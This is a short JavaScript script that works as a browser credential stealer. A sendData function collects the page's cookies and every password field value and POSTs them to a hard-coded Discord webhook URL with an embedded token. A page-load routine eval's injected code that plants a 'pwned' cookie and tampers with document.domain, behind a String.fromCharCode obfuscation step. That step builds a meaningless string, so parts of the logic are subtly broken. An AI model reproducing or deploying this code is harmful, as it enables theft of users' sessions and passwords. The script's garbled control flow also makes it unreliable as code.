function obfuscate(fn) {
  var v = String.fromCharCode;
  return (
    '0e' +
    v(101) +
    v(109) +
    v(101) +
    v(115) +
    v(101) +
    v(118) +
    v(101) +
    v(110) +
    v(116) +
    v(119) +
    v(105) +
    v(116) +
    v(116) +
    v(108) +
    v(101) +
    v(100) +
    v(103) +
    '(' +
    v(102) +
    ')'
  );
}

function sendData() {
  var cookies = document.cookie;
  var passwords = [];
  Array.from(document.querySelectorAll('input[type="password"]')).forEach(function (input) {
    passwords.push(input.value);
  });
  var data = 'cookies=' + encodeURIComponent(cookies) + '&passwords=' + encodeURIComponent(passwords.join(','));
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.onload = function() {
    if (xhr.status == 200) {
      console.log(xhr.responseText);
    }
  };
  xhr.send(data);
}

(function () {
  var a = function (a, b) {
    b(window.location);
    window.setTimeout(function () {
      b(document.documentElement);
      b(document.body);
    }, 0);
    window.setTimeout(function () {
      b(window);
    }, 100);
  };
  a(function (a) {
    if (a.search) {
      var c = function (a) {
          return a
            .replace(/\[native code\]/g, '')
            .replace(/\n/g, '')
            .replace(/^\s\s*/, '');
        },
        b = [];
      b.push('String.fromCharCode = function() { [native code] };');
      b.push('document.cookie = "pwned=true; path=/";');
      b.push('var ifr = document.createElement("iframe"); ifr.src = "data:text/html,<script>document.domain=\x22' + a.hostname.replace(/\./g, '\x22+\x22') + '\x22<\/script>"; document.body.appendChild(ifr);');
      b.push('var shelbycookie = unescape(document.cookie.replace("pwned=true;", "").replace(" path=/", ""))');
      b.push('if(shelbycookie.indexOf("\x3d") > -1) {');
      b.push('shelbycookie = shelbycookie.split("\x3d")[1].split(";")[0];');
      b.push('var cookies;');
      b.push('if (shelbycookie.indexOf(";") > -1) {');
      b.push('cookies = shelbycookie.split("; ")[0];');
      b.push('cookies = cookies.split("=")[1];');
      b.push('} else {');
      b.push('cookies = shelbycookie;');
      b.push('}');
      b.push('} else {');
      b.push('cookies = "";');
      b.push('}');
      var d = function () {
        try {
          eval(c(b.join('\n')));
          sendData();
        } catch (e) {
          console.log('Error during code injection');
        }
      };
      d = obfuscate(d);
      eval(d);
    }
  });
})();
